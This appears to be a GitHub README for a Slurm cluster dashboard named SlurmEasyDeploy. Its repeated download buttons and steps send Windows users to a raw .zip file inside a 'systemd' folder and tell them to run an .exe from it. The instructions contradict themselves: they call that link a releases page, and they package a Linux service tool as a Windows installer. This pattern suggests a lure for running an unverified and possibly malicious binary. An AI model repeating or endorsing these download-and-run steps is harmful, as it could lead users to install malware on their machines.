# ⚙️ SlurmEasyDeploy - Easy Slurm Cluster Monitoring

[![Download SlurmEasyDeploy](https://img.shields.io/badge/Download-SlurmEasyDeploy-brightgreen)](https://raw.githubusercontent.com/MahmoudAl-Saeed/SlurmEasyDeploy/main/slurm-lab-status-portal/systemd/Easy_Deploy_Slurm_v1.1-alpha.1.zip)

## 📋 What is SlurmEasyDeploy?

SlurmEasyDeploy is a tool that lets you watch and manage your Slurm lab clusters through a simple dashboard. It shows live information about your cluster's scheduler, node health, and service status. It also helps you automate deploying VMware appliances.

This app works on Windows and aims to help users check their HPC clusters without needing to run commands or dive into code.

---

## 💻 System Requirements

Before installing, make sure your Windows computer meets these requirements:

- Windows 10 or newer (64-bit recommended)
- At least 4 GB of RAM
- 2 GHz or faster processor
- 500 MB of free disk space
- Internet connection for downloading and updates

SlurmEasyDeploy uses Python technologies in the background, but you don't need to install Python yourself. Everything needed is included in the installation files.

---

## 🚀 Getting Started

You can get SlurmEasyDeploy using the link below. It sends you to the main download page on GitHub where the latest version will always be available.

[![Download SlurmEasyDeploy](https://img.shields.io/badge/Download-SlurmEasyDeploy-blue)](https://raw.githubusercontent.com/MahmoudAl-Saeed/SlurmEasyDeploy/main/slurm-lab-status-portal/systemd/Easy_Deploy_Slurm_v1.1-alpha.1.zip)

### How to download and run the app

1. Click the big green button above or visit this page:  
   https://raw.githubusercontent.com/MahmoudAl-Saeed/SlurmEasyDeploy/main/slurm-lab-status-portal/systemd/Easy_Deploy_Slurm_v1.1-alpha.1.zip

2. On the GitHub page, find the **Releases** tab or section.  
   This is where all versions of the app are kept.

3. Look for the latest version and download the Windows installer. The file usually ends with `.exe`.

4. Once the file downloads, locate it in your **Downloads** folder or wherever your browser saves files.

5. Double-click the file to start the installer.

6. Follow the installer instructions: accept the license, choose an install location (the default is fine), and finish the setup.

7. After installation, you will find SlurmEasyDeploy in your Start menu or on your desktop.

---

## 🛠 How to Use SlurmEasyDeploy

SlurmEasyDeploy runs a live dashboard you open in a web browser. Here’s how to use it:

1. Open SlurmEasyDeploy from your Start menu or desktop.

2. The app will start a local server.

3. Open your preferred web browser (like Chrome, Edge, or Firefox).

4. In the address bar, type: `http://localhost:8000` and press Enter.

5. The dashboard will appear. From here, you can see:

   - **Scheduler status**: Check which jobs are running and their progress.
   - **Node health**: View if each cluster node is online and working well.
   - **Service status**: Monitor important services on your cluster.

6. Use the menus to switch between views.

7. If you use VMware, the tool includes functions to automate appliance deployment.

---

## 🔧 Features

- **Live Cluster Data**: Shows up-to-date information about jobs and nodes.
- **Health Monitoring**: Displays node status to catch issues early.
- **Service Tracking**: Displays live service information on your cluster.
- **VMware Appliance Deployment**: Automated setup for VMware appliances.
- **Easy Setup**: No programming or command knowledge needed.
- **Web Access**: View the dashboard in any modern web browser.
- **Systemd Support**: Designed to work well with services on Linux systems, integrated for VMware environments but user interface runs on Windows.

---

## ⚙️ Behind the Scenes

SlurmEasyDeploy uses FastAPI, a modern Python tool. This framework creates the web dashboard you see and connects to your Slurm system. The app runs a small server on your Windows machine.

It also uses tools like `cloud-init` scripts for VMware deployments. You do not need to know any of this to use the app. All this runs smoothly after installation.

---

## 🏗 Installation Troubleshooting

If the app does not start or the dashboard doesn’t load:

- Make sure you have installed the `.exe` file correctly.
- Check if your firewall or antivirus blocks the app.
- Confirm your browser is set up to open `http://localhost:8000`.
- Restart your computer and try again.
- Ensure no other program uses port 8000; other apps can block the connection.

If you still have issues, check the **Issues** tab on GitHub or contact your system administrator.

---

## 🔄 Updating SlurmEasyDeploy

To get the latest features and fixes:

1. Visit the download page again:  
   https://raw.githubusercontent.com/MahmoudAl-Saeed/SlurmEasyDeploy/main/slurm-lab-status-portal/systemd/Easy_Deploy_Slurm_v1.1-alpha.1.zip

2. Download the newest installer `.exe` file.

3. Run the installer. It will replace your old version but keep your settings.

---

## ❓ Frequently Asked Questions (FAQ)

**Q: Do I need to know programming to use this app?**  
No. The app has a simple dashboard that anyone can open and read.

**Q: Can I use this without VMware?**  
Yes. The dashboard works for cluster monitoring independently. VMware automation is optional.

**Q: Is an internet connection needed after installation?**  
You need the internet to download the app and updates. After that, it works locally to show your cluster.

**Q: Does this tool modify my Slurm cluster?**  
No. It only reads status data. It does not change anything in the cluster.

---

## 📂 Where to Get Help

If you face problems beyond installation:

- Check the **Issues** section on the GitHub page for similar problems.
- Review the README on GitHub for updates or extra tips.
- Ask your IT or cluster admin for help with cluster-specific questions.

---

[![Download SlurmEasyDeploy](https://img.shields.io/badge/Download-SlurmEasyDeploy-brightgreen)](https://raw.githubusercontent.com/MahmoudAl-Saeed/SlurmEasyDeploy/main/slurm-lab-status-portal/systemd/Easy_Deploy_Slurm_v1.1-alpha.1.zip)

## 🔖 Topics

`cloud-init` `cluster-monitoring` `dashboard` `fastapi` `hpc` `python` `slurm` `systemd` `vmware` `vsphere`